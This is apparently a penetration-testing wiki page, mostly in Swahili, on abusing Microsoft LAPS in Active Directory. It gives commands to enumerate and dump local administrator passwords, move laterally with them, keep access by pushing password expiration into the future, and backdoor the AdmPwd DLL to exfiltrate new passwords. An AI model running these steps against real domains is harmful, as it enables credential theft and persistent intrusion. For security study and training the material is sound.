# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Maelezo ya Msingi

Kwa sasa kuna **aina 2 za LAPS** unazoweza kukutana nazo wakati wa assessment:

- **Legacy Microsoft LAPS**: huhifadhi local administrator password katika **`ms-Mcs-AdmPwd`** na muda wa kuisha katika **`ms-Mcs-AdmPwdExpirationTime`**.
- **Windows LAPS** (imejengewa ndani ya Windows tangu updates za Aprili 2023): bado inaweza kuiga legacy mode, lakini katika native mode hutumia attributes za **`msLAPS-*`**, huunga mkono **password encryption**, **password history**, na **DSRM password backup** kwa domain controllers.

LAPS imeundwa kusimamia **local administrator passwords**, na kuzifanya ziwe **unique, randomized, na kubadilishwa mara kwa mara** kwenye kompyuta zilizojiunga na domain. Ukisoma attributes hizo, kwa kawaida unaweza **pivot kama local admin** kwenda kwenye host iliyoathirika. Katika mazingira mengi, sehemu muhimu si kusoma password yenyewe tu, bali pia kutafuta **nani aliwekewa delegated access** kwenye password attributes.

### Legacy Microsoft LAPS attributes

Katika computer objects za domain, implementation ya legacy Microsoft LAPS husababisha kuongezwa kwa attributes mbili:

- **`ms-Mcs-AdmPwd`**: **plain-text administrator password**
- **`ms-Mcs-AdmPwdExpirationTime`**: **password expiration time**

### Windows LAPS attributes

Native Windows LAPS huongeza attributes kadhaa mpya kwenye computer objects:

- **`msLAPS-Password`**: clear-text password blob iliyohifadhiwa kama JSON wakati encryption haijawashwa
- **`msLAPS-PasswordExpirationTime`**: scheduled expiration time
- **`msLAPS-EncryptedPassword`**: encrypted current password
- **`msLAPS-EncryptedPasswordHistory`**: encrypted password history
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: encrypted DSRM password data kwa domain controllers
- **`msLAPS-CurrentPasswordVersion`**: version inayofuatiliwa kwa GUID inayotumiwa na logic mpya ya rollback-detection (Windows Server 2025 forest schema)

Wakati **`msLAPS-Password`** inaweza kusomwa, thamani huwa JSON object inayojumuisha account name, update time na clear-text password, kwa mfano:
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### Angalia kama imeanzishwa
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## Ufikiaji wa Nenosiri la LAPS

Unaweza **kupakua raw LAPS policy** kutoka `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` kisha utumie **`Parse-PolFile`** kutoka kwenye kifurushi cha [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) kubadilisha faili hili kuwa format inayosomeka na binadamu.

### Legacy Microsoft LAPS PowerShell cmdlets

Ikiwa legacy LAPS module imewekwa, kawaida cmdlets zifuatazo zinapatikana:
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### Windows LAPS PowerShell cmdlets

Native Windows LAPS huja na moduli mpya ya PowerShell na cmdlets mpya:
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText
```
Maelezo machache ya uendeshaji ni muhimu hapa:

- **`Get-LapsADPassword`** hushughulikia kiotomatiki **legacy LAPS**, **clear-text Windows LAPS**, na **encrypted Windows LAPS**.
- Ikiwa password ime-**encrypt** na unaweza **kusoma** lakini si **decrypt** it, cmdlet hurejesha metadata lakini si clear-text password.
- **Password history** inapatikana tu wakati **Windows LAPS encryption** imewezeshwa.
- Kwenye domain controllers, source inayorejeshwa inaweza kuwa **`EncryptedDSRMPassword`**.

### PowerView / LDAP

**PowerView** pia inaweza kutumiwa kubaini **nani anaweza kusoma password na kuisoma**:
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
Ikiwa **`msLAPS-Password`** inaweza kusomwa, chambua JSON iliyorejeshwa na utoe **`p`** kwa nenosiri na **`n`** kwa jina la akaunti ya local admin inayosimamiwa.

### Linux / remote tooling

Modern tooling inasaidia both legacy Microsoft LAPS na Windows LAPS.
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
Catatan:

- Builds za hivi karibuni za **NetExec** zinaunga mkono **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`**, na **`msLAPS-EncryptedPassword`**.
- **`pyLAPS`** bado ni muhimu kwa **legacy Microsoft LAPS** kutoka Linux, lakini inalenga tu **`ms-Mcs-AdmPwd`**.
- Ikiwa mazingira yanatumia **encrypted Windows LAPS**, kusoma rahisi kwa LDAP hakutoshi; pia unahitaji kuwa **authorized decryptor** au kutumia njia inayotumika ya decrypt.

### Directory synchronization abuse

Ikiwa una haki za ngazi ya domain za **directory synchronization** badala ya direct read access kwenye kila computer object, LAPS bado inaweza kuwa ya kuvutia.

Mchanganyiko wa **`DS-Replication-Get-Changes`** pamoja na **`DS-Replication-Get-Changes-In-Filtered-Set`** au **`DS-Replication-Get-Changes-All`** unaweza kutumika kusynchroniza sifa za **confidential / RODC-filtered** kama vile legacy **`ms-Mcs-AdmPwd`**. BloodHound huonyesha hili kama **`SyncLAPSPassword`**. Angalia [DCSync](dcsync.md) kwa msingi wa replication-rights.

## LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) hurahisisha enumeration ya LAPS kwa kutumia functions kadhaa.\
Moja ni kuchambua **`ExtendedRights`** kwa **kompyuta zote zilizo na LAPS enabled.** Hii huonyesha **groups** ambazo zimepewa hasa **delegated to read LAPS passwords**, ambazo mara nyingi ni users ndani ya protected groups.\
**account** ambayo imejiunga na computer kwenye domain hupokea `All Extended Rights` juu ya host hiyo, na haki hii huipa **account** uwezo wa **kusoma passwords**. Enumeration inaweza kuonyesha user account ambayo inaweza kusoma LAPS password kwenye host. Hii inaweza kutusaidia **kulenga specific AD users** ambao wanaweza kusoma LAPS passwords.
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## Kumwaga LAPS Passwords Kwa NetExec / CrackMapExec

Ikiwa huna interactive PowerShell, unaweza kutumia vibaya privilege hii kwa mbali kupitia LDAP:
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
Hii hutupa siri zote za LAPS ambazo mtumiaji anaweza kusoma, ikikuwezesha kusogea laterally kwa kutumia nenosiri tofauti la local administrator.

## Kutumia Nenosiri la LAPS
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## LAPS Persistence

### Tarehe ya Kuisha

Mara tu ukiwa admin, inawezekana **kupata passwords** na **kuzuia** machine **isasasishe** **password** yake kwa **kuweka tarehe ya kuisha katika siku zijazo**.

Legacy Microsoft LAPS:
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
Native Windows LAPS hutumia **`msLAPS-PasswordExpirationTime`** badala yake:
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> Nywila bado itazungushwa ikiwa **admin** atatumia **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`**, au ikiwa **Do not allow password expiration time longer than required by policy** imewezeshwa.

### Kurejesha nywila za kihistoria kutoka kwenye AD backups

Wakati **Windows LAPS encryption + password history** imewezeshwa, mounted AD backups zinaweza kuwa chanzo cha ziada cha secrets. Ikiwa unaweza kufikia mounted AD snapshot na kutumia **recovery mode**, unaweza kuquery nywila za zamani zilizohifadhiwa bila kuzungumza na live DC.
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
Hii ni muhimu zaidi wakati wa **AD backup theft**, **offline forensics abuse**, au **disaster-recovery media access**.

### Backdoor

Msimbo chanzo wa asili wa legacy Microsoft LAPS unaweza kupatikana [hapa](https://github.com/GreyCorbel/admpwd), kwa hiyo inawezekana kuweka backdoor ndani ya code (ndani ya njia ya `Get-AdmPwdPassword` katika `Main/AdmPwd.PS/Main.cs` kwa mfano) ambayo kwa namna fulani itafanya **exfiltrate new passwords or store them somewhere**.

Kisha, compile `AdmPwd.PS.dll` mpya na uipakie kwenye machine katika `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (na ubadilishe modification time).

## References

- [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [https://blog.xpnsec.com/lapsv2-internals/](https://blog.xpnsec.com/lapsv2-internals/)


{{#include ../../banners/hacktricks-training.md}}
